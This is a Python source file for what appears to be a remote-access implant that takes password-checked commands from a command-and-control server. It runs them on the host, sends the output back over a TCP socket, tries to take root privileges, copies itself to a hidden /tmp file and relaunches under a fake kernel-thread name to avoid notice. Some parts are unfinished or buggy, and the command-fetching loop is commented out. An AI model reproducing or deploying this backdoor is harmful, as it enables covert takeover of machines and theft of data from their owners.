#!/usr/bin/env python3

import subprocess
import hashlib
import os
import requests
import socket
import pwd
import psutil
import shutil 

import shlex

password = "password"
HOST, PORT = "0.0.0.0", 9998

"""
Command format: 
{key}:{command}:{parameters}:{hash}
"""


def handle(data):
    # self.request is the TCP socket connected to the client
    # self.data = str(self.request.recv(2048).strip())[2:-1].split(":")
    key = data[0]
    command = data[1]
    parameters = data[2]
    hash = data[3]

    if verify(key) and check_hash(key, command, parameters, hash):
        if command == "BUILTIN":
            stdout = run_builtin(parameters)
        else:
            stdout = run_command(command, parameters)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        # Connect to server and send data
        sock.connect((HOST, PORT))
        output = f"Command: {command} {parameters}\n{stdout}"
        sock.sendall(bytes(output + "\n", "utf-8"))

def request_commands():
    r = requests.get(f"http://0.0.0.0:{PORT + 1}/commands.txt")
    return r.text.split()

def run_builtin(command):
    """
    Use builtin python functions
    """
    if command == "name":
        return f"{os.uname().sysname} {os.uname().release} {os.uname().version} {os.uname().machine}"
    elif command == "cwd":
        return os.getcwd()
    elif command == "env":
        return os.getenv()
    elif command == "pid":
        return str(os.getpid())


def run_command(command, parameters):
    """
    Run command on local terminal 
    """
    try:
        cmd = subprocess.run([command, parameters], capture_output=True, check=True, encoding='utf-8')
    except subprocess.CalledProcessError:
        return "Error on Command"
    
    return cmd.stdout

def verify(key):
    """
    Verify that the password from C2 matches local
    """
    if key == password:
        return True
    
    return False

def get_pname(id):
    return os.system("ps -o cmd= {}".format(id))


def check_hash(key, command, parameters, hash):
    """
    Check that no data transmission errors have occured
    """
    data = f"{key}:{command}:{parameters}"
    if hashlib.sha256(data.encode("utf-8")).hexdigest() != hash:
        print("Data error detected!")
        return False
    return True


if __name__ == "__main__":
    try:
        uid = pwd.getpwnam('root')[2]
        os.setuid(uid)
    except PermissionError:
        pass
    # TODO: Run as new bash process

    p = psutil.Process(os.getpid())
    cmdline = p.cmdline()[1]
    if "tmp" not in cmdline:
        hidden, bandit = "/tmp/.chrome_temp_buffer", "[kworker/2:0-events]"
        shutil.copyfile(cmdline, hidden)
        cmd = subprocess.run(["/bin/chmod", "+x",  f"{hidden}"])
        cmd = subprocess.run(shlex.split(f"bash -c \"exec -a {bandit} {p.exe()} {hidden} &\""))
        cmd = subprocess.run(["/bin/chmod", "-x",  f"{hidden}"])
        while 1:
            continue
    else:
        print("Hidden")
        while 1:
            continue

    # cmds = request_commands()

    # for cmd in cmds:
    #     handle(cmd.split(":"))
